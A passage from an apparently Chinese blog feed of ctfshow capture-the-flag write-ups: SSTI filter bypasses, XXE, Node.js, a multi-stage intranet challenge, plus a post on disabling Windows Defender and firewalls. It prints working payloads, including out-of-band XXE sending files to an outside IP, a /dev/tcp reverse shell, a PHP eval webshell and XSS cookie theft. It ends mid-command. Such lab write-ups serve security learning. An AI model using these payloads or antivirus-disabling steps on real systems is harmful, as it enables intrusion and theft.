363</h2><p>过滤了单双引号：使用`request，从而避免单双引号的使用</p><pre class="line-numbers language-none"><code class="language-none">?name={{x.__init__.__globals__[request.args.x1].eval(request.args.x2)}}&amp;x1=__builtins__&amp;x2=__import__('os').popen('cat /flag').read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-364"><a href="#web-364" class="headerlink" title="web 364"></a>web 364</h2><p>过滤了单双引号、args</p><pre class="line-numbers language-none"><code class="language-none">?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}Cookie传参：x2=__import__('os').popen('ls /').read();x1=__builtins__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web-365"><a href="#web-365" class="headerlink" title="web 365"></a>web 365</h2><p>增加过滤了<code>[]</code> <strong>可以用<code>__getitem()__</code>用来获取序号</strong></p><pre class="line-numbers language-none"><code class="language-none">?name={{x.__init__.__globals__.__getitem__(request.cookies.x1).eval(request.cookies.x2)}}Cookie传参：x2=__import__('os').popen('cat /f*').read();x1=__builtins__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web-366-367"><a href="#web-366-367" class="headerlink" title="web 366-367"></a>web 366-367</h2><p>下划线<code>_</code>被过滤 那么要用request.cookies.x1来传参。凡是有过滤的，都可以尝试使用request来替代<br>对照着原型x.<strong>init</strong>.<strong>globals</strong>[‘<strong>builtins</strong>‘].eval(“<strong>import</strong>(‘os’).popen(‘ls /‘).read()”)<br>即可写出来：</p><pre class="line-numbers language-none"><code class="language-none">?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}Cookie传参：x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /flag').read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web-368"><a href="#web-368" class="headerlink" title="web  368"></a>web  368</h2><p>既然<code>{{}}</code>不给用，那么<code>{% print()%}</code>一样可以输出</p><pre class="line-numbers language-none"><code class="language-none">?name={%print((x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5))%}Cookie传参：x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /f*').read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web-369"><a href="#web-369" class="headerlink" title="web 369"></a>web 369</h2><p> 过滤<code>request</code></p><pre class="line-numbers language-none"><code class="language-none">http://ec6b99bb-953a-4e28-8962-084bda49c739.chall.ctf.show/?name={% set po=dict(po=a,p=a)|join%}  # dict()|join 拼接键名的方式，此处得到变量po=pop{% set a=(()|select|string|list)|attr(po)(24)%}#通过pop(24)选择到“_”下划线并赋值给a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}#ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}#glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}#geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}#built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}#x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%}#chr=x.chr 选择到了chr函数，chr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}#结合ASCII和chr函数构造。file=/flag{%print(x.open(file).read())%}#利用open函数读取<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web-370"><a href="#web-370" class="headerlink" title="web 370"></a>web 370</h2><p>过滤了数字 </p><pre class="line-numbers language-none"><code class="language-none">?name={% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web-371"><a href="#web-371" class="headerlink" title="web 371"></a>web 371</h2><p>过滤了print</p><pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2022/01/22/ctfshow-xxe/"/>
      <url>/2022/01/22/ctfshow-xxe/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://xz.aliyun.com/t/3357#toc-2">一篇文章带你深入理解漏洞之XXE</a></p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/115091314">XML基础知识</a></p><h2 id="373"><a href="#373" class="headerlink" title="373"></a>373</h2><p>很明显可以实体注入，而且是有回显的，所以要注意的是 <code>echo $creds-&gt;ctfshow</code>是<code>echo</code>出<code>ctfshow</code>这个元素，因此一定要用它来包裹实体</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE note[   &lt;!ENTITY test SYSTEM "file:///flag"&gt;]&gt;&lt;note&gt;     &lt;ctfshow&gt;         &amp;test;     &lt;/ctfshow&gt;               &lt;/note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-xxe/image-20211127213543086.png" alt="image-20211127213543086"></p><p>提示 :  抓包的请求头 Connection 要删除 或者 keep-alive<img src="/2022/01/22/ctfshow-xxe/image-20211127214008110.png" alt="image-20211127214008110"></p><p>xml文档区分大小写 以及变量别忘记加分号；</p><h2 id="374"><a href="#374" class="headerlink" title="374"></a>374</h2><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;&lt;!ENTITY % remote SYSTEM "http://82.156.168.16/xxe.xml"&gt;%remote;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>xxe.xml</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % all"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://82.156.168.16/xxe.php?1=%file;' "&gt;&gt;%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xxe.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  $content= $_GET['1'];  if(isset($content)){    file_put_contents('flag.txt',$content);  }  else {      echo 'nodata';  }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="375"><a href="#375" class="headerlink" title="375"></a>375</h2><p>同上   原理相同的 payload 另种写法</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://82.156.168.16/xxe.dtd"&gt;%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xxe.dtd</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://82.156.168.16:7777?p=%file;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-xxe/image-20220906184448585.png" alt="image-20220906184448585"></p><h2 id="376"><a href="#376" class="headerlink" title="376"></a>376</h2><p>编码绕过</p><h2 id="377"><a href="#377" class="headerlink" title="377"></a>377</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM "file:///flag"&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;a&lt;/password&gt;&lt;/user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-xxe/image-20220204152353067.png" alt="image-20220204152353067"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node.js</title>
      <link href="/2022/01/22/ctfshow-node.js/"/>
      <url>/2022/01/22/ctfshow-node.js/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="334"><a href="#334" class="headerlink" title="334"></a>334</h2><p>use.js 有用户名和密码,但login.js发现</p><p><img src="/2022/01/22/ctfshow-node.js/image-20211125194424142.png" alt="image-20211125194424142"></p><p>通过分析逻辑可以知道username=ctfshow 就可以了</p><h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>通过查看源代码的到提示eval 推测是命令执行 child_process模块</p><p>payload:   ?eval=require(“child_process”).execSync(“ls”)</p><h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>方法一：payload: ?eval=require(“child_process”).spawnSync(“ls”).stdout.toString() 但是不知道为什么cat flag那搞不出</p><p>方法二：?eval=require(‘child_process’)[‘exe’%2B’cSync’](‘cat fl001g.txt’)</p><p>方法三：?eval=__filename 获取当前模块文件被解析后的绝对路径.再?eval=require(“fs”).readFileSync(“路径”)就可以查看被过滤了’exec’还有’load’。</p><p> 其实也可以直接 ?eval=require(“fs”).readFileSync(‘fl001g.txt’) 得到flag</p><h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><p>md5强类型 数组可以绕过</p><p>?a[]=1&amp;&amp;b[]=1</p><h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03"> JavaScript Prototype 污染攻击</a></p><p>每个对象都有一个__proto__指向它的构造函数的原型对象(prototype)</p><pre class="line-numbers language-none"><code class="language-none">foo.__proto__ == Foo.prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102216576.png" alt="image-20211127102216576"></p><p>条件是：<code>secert.ctfshow==='36dboy'</code>，但utils.copy函数是关键：它会将<code>object1[key] = object2[key]</code>从而实现原型链的污染</p><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102332550.png" alt="image-20211127102332550"></p><p><img src="/2022/01/22/ctfshow-node.js/image-20211127102150846.png" alt="image-20211127102150846"></p><h2 id="339"><a href="#339" class="headerlink" title="339"></a>339</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p> ejs rce <a href="https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/">https://xianbeil.github.io/2022/05/28/ejs%E6%A8%A1%E6%9D%BFrce%E7%9A%84%E5%88%9D%E6%8E%A2/</a></p><pre class="line-numbers language-none"><code class="language-none">payload :{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/1337 0&gt;&amp;1\"');var __tmp2"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2022/01/22/ctfshow-node.js/image-20220822155411322.png" alt="image-20220822155411322"></p><p>rce后 cat login.js 就可以得到flag</p><p><img src="/2022/01/22/ctfshow-node.js/image-20220822155514614.png" alt="image-20220822155514614"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关闭Windows Defender实时保护，暂时关闭和永久关闭方法.md</title>
      <link href="/2022/01/22/guan-bi-windows-defender-shi-shi-bao-hu-zan-shi-guan-bi-he-yong-jiu-guan-bi-fang-fa-md/"/>
      <url>/2022/01/22/guan-bi-windows-defender-shi-shi-bao-hu-zan-shi-guan-bi-he-yong-jiu-guan-bi-fang-fa-md/</url>
      
        <content type="html"><![CDATA[<h2 id="关闭Windows-Defender实时保护，暂时关闭和永久关闭方法"><a href="#关闭Windows-Defender实时保护，暂时关闭和永久关闭方法" class="headerlink" title="关闭Windows Defender实时保护，暂时关闭和永久关闭方法"></a>关闭Windows Defender实时保护，暂时关闭和永久关闭方法</h2><p>暂时关闭Windows Defender实时保护<br>点击开始→设置→更新和安全→Windows安全中心，打开Windows安全中心；<br>点击主页→病毒和威胁防护或管理设置，关闭实时保护。<br>这样就暂时关闭了实时保护，就算不重启也可能某个时候又自动打开了实时保护。</p><p>永久关闭实时保护<br>Win+r 输入regedit启动注册表编辑器；<br>定位到以下路径计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Feature，然后在右侧栏空白处右击鼠标，新建一个DWORD(32)值，重命名为DisableAvCheck并赋值为1；<br>继续在计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender下新建DWORD(32)值，并重命名为DisableAntiSpyware，并赋值为1；<br>最后我们重新启动电脑。<br>这时Windows Defender便被彻底关闭掉了，win10的实时保护功能也禁止了，停止了自动运行，系统速度终于恢复正常。</p><p>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection</p><p>把DisableRealtimeMonitoring从0改为1 </p><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><p>买了腾讯云服务器 防火墙问题之类的</p><p>1.关闭ubuntu的防火墙 ufw disable<br>2.卸载了iptables         apt-get remove iptables</p><p>1.用iptables -F这个命令来关闭防火墙,但是使用这个命令前,千万记得用iptables -L查看一下你的系统中所有链的默认target,iptables -F这个命令只是清除所有规则,只不会真正关闭iptables.想象一下,如果你的链默认target是DROP,本来你有规则来允许一些特定的端口, 但一旦应用iptables -L ,清除了所有规则以后,默认的target就会阻止任何访问,当然包括远程ssh管理服务器的你.</p><p>　　所以我建议的关闭防火墙命令是 </p><p>　　iptables -P INPUT ACCEPT </p><p>　　iptables -P FORWARD ACCEPT </p><p>　　iptables -P OUTPUT ACCEPT </p><p>　　iptables -F </p><p>　 　总之,当你要在你的服务器上做任何变更时,最好有一个测试环境做过充分的测试再应用到你的服务器.除此之外,要用好iptables,那就要理解 iptables的运行原理,知道对于每一个数据包iptables是怎么样来处理的.这样才能准确地书写规则,避免带来不必要的麻烦.</p>]]></content>
      
      
      <categories>
          
          <category> 关防护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubantu防火墙 出网之类的问题 </tag>
            
            <tag> windows自带杀马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终极考核</title>
      <link href="/2022/01/20/ctfshow-zhong-ji-kao-he/"/>
      <url>/2022/01/20/ctfshow-zhong-ji-kao-he/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>注：  目录序号 是我做题得到的答案序号</p><h2 id="640"><a href="#640" class="headerlink" title="640"></a>640</h2><pre class="line-numbers language-none"><code class="language-none">flag_640=ctfshow{060ae7a27d203604baeb125f939570ef}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="641"><a href="#641" class="headerlink" title="641"></a>641</h2><p>F12 network查看请求头</p><p>flag_641=ctfshow{affac61c787a82cc396585bea8ecf2dc}</p><h2 id="642"><a href="#642" class="headerlink" title="642"></a>642</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209203650604.png" alt="image-20211209203650604"></p><p>system36d 好奇怪  输入  然后发现会自动跳转  那我抓包看看<img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209203732621.png" alt="image-20211209203732621"></p><h2 id="644"><a href="#644" class="headerlink" title="644"></a>644</h2><p>发现第二个是有x   猜测是0x然后36d  果不其然对了。。。</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211209233233540.png" alt="image-20211209233233540"></p><h2 id="645"><a href="#645" class="headerlink" title="645"></a>645</h2><p>flag_645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}</p><p>数据备份中</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210210217403.png" alt="image-20211210210217403"></p><h2 id="643"><a href="#643" class="headerlink" title="643"></a>643</h2><p>ping 命令模块 抓包  输入命令 ls  发现secret.txt文件  然后进入url解码</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211210213332983.png" alt="image-20211210213332983"></p><h2 id="646"><a href="#646" class="headerlink" title="646"></a>646</h2><p>根据包含信息，拿到init.php的源码</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210172627619.png" alt="image-20220210172627619"></p><h2 id="647"><a href="#647" class="headerlink" title="647"></a>647</h2><p> !==逻辑    striopos传数组会返回null    因此只需要找到无参数的返回数组的函数</p><p>flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212193212450.png" alt="image-20211212193212450"></p><h2 id="648"><a href="#648" class="headerlink" title="648"></a>648</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212200922362.png" alt="image-20211212200922362"></p><p>flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}</p><h2 id="649"><a href="#649" class="headerlink" title="649"></a>649</h2><p>flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212205930462.png" alt="image-20211212205930462"></p><h2 id="650"><a href="#650" class="headerlink" title="650"></a>650</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211212210146509.png" alt="image-20211212210146509"></p><p>flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}</p><h2 id="651"><a href="#651" class="headerlink" title="651"></a>651</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211213204319922.png" alt="image-20211213204319922"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211213204301114.png" alt="image-20211213204301114"></p><p>flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}</p><h2 id="652"><a href="#652" class="headerlink" title="652"></a>652</h2><p>查看 util/common.php </p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216195339944.png" alt="image-20211216195339944"></p><p>发现文件包含漏洞 一开始发现有新增用户功能可以写入数据库  写入恶意马进去</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php file_put_contents("shell.php","&lt;?php @eval(\$_POST[1]); ?&gt;"); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看dbutil.php</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216210036652.png" alt="image-20211216210036652"></p><p>想办法得到key</p><p>然后发现page.php可以sql注入;</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216210928095.png" alt="image-20211216210928095"></p><p>发现key=key_is_here_you_know</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216195634626.png" alt="image-20211216195634626"></p><p>然后蚁剑连shell.php</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216213043468.png" alt="image-20211216213043468"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211218121908857.png" alt="image-20211218121908857"></p><p>啊咧 啥都不能看  查看题目的phpinfo disable_functions还有<img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220308185847761.png" alt="image-20220308185847761"></p><p>明白原因  因题目还有数据库 可以用蚁剑看看数据库</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211216213226631.png" alt="image-20211216213226631"></p><p>flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}</p><h2 id="653"><a href="#653" class="headerlink" title="653"></a>653</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211218122840454.png" alt="image-20211218122840454"></p><p>flag_653=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}</p><h2 id="654"><a href="#654" class="headerlink" title="654"></a>654</h2><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a> 国光提权</p><p>ls 发现有个root目录  就想到要提权 </p><p>udf 提权步骤  （前提是确认要 secure_file_priv 没有限制）</p><p>1.寻找插件目录</p><p>2.写入动态链接库</p><p>3.创建自定义函数</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219195859196.png" alt="image-20211219195859196"></p><p>不要忘记 base64解码后 再放进去 udf.so 文件中</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219195946821.png" alt="image-20211219195946821"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219200044995.png" alt="image-20211219200044995"></p><p>赋予最高权限</p><p>再然后到数据库中 执行自定义函数  别忘记加sudo命令</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20211219200143737.png" alt="image-20211219200143737"></p><p>flag_654=ctfshow{4ab2c2ccd0c3c35fdba418d8502f5da9} </p><h2 id="655"><a href="#655" class="headerlink" title="655"></a>655</h2><p>先扫描存活的主机和端口，得先知道主机上有什么服务，好开启下一步。</p><p>ifconfig 知道当前内网ip </p><p>ping 获取存活的主机</p><p>curl 请求 Web 服务器 知道了phpinfo.php 还有<a href="http://www.zip等等/">www.zip等等</a></p><p>flag_655=ctfshow{aada21bce99ddeab20020ac714686303}</p><h2 id="656"><a href="#656" class="headerlink" title="656"></a>656</h2><p>解压<a href="http://www.zip/">www.zip</a> 题目提示xss</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220112211537045.png" alt="image-20220112211537045"></p><p>发现可以xff注入恶意脚本获取管理员cookie</p><p>在内网上搭建1.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php \$content=\$_GET['s']; file_put_contents("log.txt",\$content);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在终端中输入  curl -H ‘X-Forwarded-For:</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,50,51,56,46,52,47,49,46,112,104,112,63,115,61)+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>String.fromCharCode中的内容用如下代码生成</p><pre class="line-numbers language-none"><code class="language-none">s="http://172.2.238.5/1.php?s=" #当然每个人的内网地址可能不一样a=''for i in s:    a=a+str(ord(i))+','print(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220207195002335.png" alt="image-20220207195002335"></p><p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p><h2 id="657"><a href="#657" class="headerlink" title="657"></a>657</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220113140742418.png" alt="image-20220113140742418"></p><p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p><h2 id="658"><a href="#658" class="headerlink" title="658"></a>658</h2><p>添加以下说明，file_exists()函数可以访问ftp上的文件。那么思路就是先自己起一个ftpserver，无论请求任何文件都返回文件存在，发现已控制的主机A安装有python3</p><p>上传ftp伪造脚本：</p><pre class="line-numbers language-none"><code class="language-none">import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind(('0.0.0.0', 21))s.listen(1)print('listening 0.0.0.0 21\n')conn, addr = s.accept()conn.send(b'220 a\n')conn.send(b'230 a\n')conn.send(b'200 a\n')conn.send(b'200 a\n')conn.send(b'200\n')conn.send(b'200 a\n')conn.send(b'200\n')conn.send(b'200 a\n')conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行21端口监听</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo nohup python3 /var/www/html/file_exits.py &gt; /tmp/error.log 2&gt;&amp;1 &amp;');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>绕过文件检查</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl --cookie "PHPSESSID=0mhvks32cer6mrstfkido446j8;" "http://172.2.244.5/index.php?action=main&amp;m=testFile&amp;f=ftp://web/aa"');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="659"><a href="#659" class="headerlink" title="659"></a>659</h2><pre class="line-numbers language-none"><code class="language-none">curl http://172.2.234.5/robots.txt  得到 /public/curl http://172.2.234.5/public/  然后一路往下curl http://172.2.234.5/public/Readme.txt curl http://172.2.234.5/public../ curl http://172.2.234.5/public../FLAG/ curl http://172.2.234.5/public../FLAG/flag659.txt  得到 flag_659=ctfshow{73c4213829f8b393b2082bacb4253cab}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209212546406.png" alt="image-20220209212546406"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209212712215.png" alt="image-20220209212712215"></p><p>或者利用file_get_contents</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209215515177.png" alt="image-20220209215515177"></p><h2 id="665"><a href="#665" class="headerlink" title="665"></a>665</h2><p>顺路得到flag 665</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220209215837663.png" alt="image-20220209215837663"></p><h2 id="660"><a href="#660" class="headerlink" title="660"></a>660</h2><p>让管理员去访问action=login，他自己会传个flag过去。<br>然后去日志里面看下。</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090030744.png" alt="image-20220210090030744"></p><p>flag_660_ctfshow{23e56d95b430de80c7b5806f49a14a2b}</p><h2 id="661"><a href="#661" class="headerlink" title="661"></a>661</h2><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090333472.png" alt="image-20220210090333472"></p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210090404533.png" alt="image-20220210090404533"></p><p>flag_661=ctfshow{d41c308e12fdecf7782eeb7c20f45352}</p><h2 id="662-663"><a href="#662-663" class="headerlink" title="662-663"></a>662-663</h2><pre class="line-numbers language-none"><code class="language-none">1=echo file_get_contents("http://172.2.166.5/public../home/www-data/creater.sh ");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是说flag663在一个xxx.html中，前缀是三位数的十六进制</p><p>三位数爆破得到</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210100730505.png" alt="image-20220210100730505"></p><p>扫描得到phpinfo.php  </p><p>发现存在ctfshow扩展</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105306834.png" alt="image-20220210105306834"></p><p>拓展目录<img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105347967.png" alt="image-20220210105347967"></p><p>下载到本地 </p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105421151.png" alt="image-20220210105421151"></p><p>进行反汇编或者直接0101打开，得到elf文件：</p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210105233107.png" alt="image-20220210105233107"></p><p>flag_663=ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}</p><h2 id="664"><a href="#664" class="headerlink" title="664"></a>664</h2><p>读取nginx的配置文件，得到：</p><p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220210164706238.png" alt="image-20220210164706238"></p><p>发现开了端口 8888 </p><p><img src="/2022/01/20/ctfshow-zhong-ji-kao-he/image-20220210164736957.png" alt="image-20220210164736957"></p><p>访问8888端口，发现为yii的框架，存在反序列化入口，具体怎么找出来，生成html分析表单即可（一脸懵） </p><p><a href="https://xz.aliyun.com/t/9948#toc-4">https://xz.aliyun.com/t/9948#toc-4</a> yii 2.0.42 最新反序列化利用全集</p><p>直接getshell（大懵特懵）</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('sudo curl  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d 